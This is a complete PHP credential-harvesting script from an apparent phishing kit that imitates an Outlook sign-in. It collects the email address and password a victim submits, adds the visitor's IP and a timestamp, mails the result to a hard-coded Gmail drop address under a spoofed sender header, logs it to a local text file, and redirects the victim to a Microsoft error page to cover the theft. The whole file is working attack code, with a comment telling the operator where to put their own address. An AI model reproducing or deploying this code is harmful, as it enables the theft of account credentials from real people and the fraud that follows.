<?

$adddate=date("D M d, Y g:i a");


$ip = getenv("REMOTE_ADDR");


$message .= "----------Email Access----------\n";


$message .= "Email Address  : ".$_POST['email']."\n";

$message .= "Email Password : ".$_POST['pass']."\n";


$message .= "----------Adress & Date----------\n";


$message .= "IP: ".$ip."\n";



$message .= "Date: ".$adddate."\n";
$message .= "----------In Allah We Trust----------\n";





//Change Your Email Here :D




$send = "2019logs@gmail.com";




$subject = "R3SULT | $ip | ".$country;

$headers = "From: 0UTL00K R3SULT<customer-support@boarsw2.com>";

$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message,$headers);
}


$praga=rand();


$praga=md5($praga);

header("Location: https://www.microsoft.com/en-us/errorpages/smarterror.aspx");
?>